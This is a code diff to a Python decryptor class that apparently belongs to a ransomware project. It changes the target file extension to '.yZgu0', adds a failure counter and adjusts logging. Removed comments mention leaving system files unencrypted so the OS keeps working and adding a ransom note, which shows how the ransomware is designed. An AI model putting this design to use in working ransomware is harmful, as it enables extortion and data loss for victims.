@@ -16,6 +16,7 @@ class Decryptor:
         self.drives = []
         self.filepaths = []
         self.decrypted_count = 0
+        self.fail_count = 0
 
     def scan_drives(self):
         """
@@ -29,11 +30,9 @@ class Decryptor:
         print(f"[LOG] drives found: {self.drives}, time elapsed: {end_time - start_time}s")
 
     def get_files_from_drive(self, drive):
-        """Retrieve all file paths for files with the .enc extension from a single drive."""
+        """Retrieve all file paths for files with the .yZgu0 extension from a single drive."""
         
-        #These are files and directories that we wont encrypt since they will stop the os from functioning
-        EXCLUDED_EXTENSIONS = {".exe", ".dll", ".sys", ".lnk", ".log"}
-        EXCLUDED_FILES = {"boot.ini", "bootmgr", "ntldr", "BCD"} #add ransomnote 
+        #These are files and directories that we wont scan
         EXCLUDED_DIRS = {
             "C:\\Windows",
             "C:\\Program Files",
@@ -55,13 +54,10 @@ class Decryptor:
                             scan_directory(entry.path)
                         
                         elif entry.is_file():
-                            if (
-                                entry.name.lower() not in EXCLUDED_FILES and #check if its name is in EXCLUDED_FILES
-                                not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
-                            ):  
-                                
-                                if ".enc" in entry.name.lower(): #just filter on desktop and pictures
-                                    filepaths.append(entry.path)  # Store normal files
+                             
+                            if ".yZgu0" in entry.name: #just filter on desktop and pictures
+                                #print(f"Found file: {entry.name}")
+                                filepaths.append(entry.path)  # Store normal files
             
             except (PermissionError, FileNotFoundError):
                 pass  # skip directories that cannot be accessed
@@ -86,7 +82,7 @@ class Decryptor:
         self.filepaths = [file for result in results for file in result]  # Extract normal files
         
         end_time = time.time()
-        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")     
+        print(f"[LOG] Encrypted files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")   
 
     def decrypt_footer(self, encrypted_IV, encrypted_AES_key):
         """
@@ -139,7 +135,7 @@ class Decryptor:
 
                 # check if a new AES should be decrypted, or if the same AES key was used in this file
                 if previous_encrypted_AES_key == encrypted_AES_key:
-                    print(f"[LOG] footer unchanged, using same AES key: {AES_key}")
+                    print(f"[LOG] footer unchanged, using same AES key: {symenc.AES_key}")
 
                 else:
                     # if a new footer is detected it should be extracted and decrypted
@@ -157,7 +153,7 @@ class Decryptor:
                 #decrypt encrypted content
                 decrypted_data = symenc.decrypt_string(encrypted_content)
 
-                decrypted_filepath = filepath[:-4] #remove .enc from filepath
+                decrypted_filepath = filepath[:-6] #remove .yZgu0 from filepath
 
                 with open(decrypted_filepath, "wb") as decrypted_file:
                     decrypted_file.write(decrypted_data)
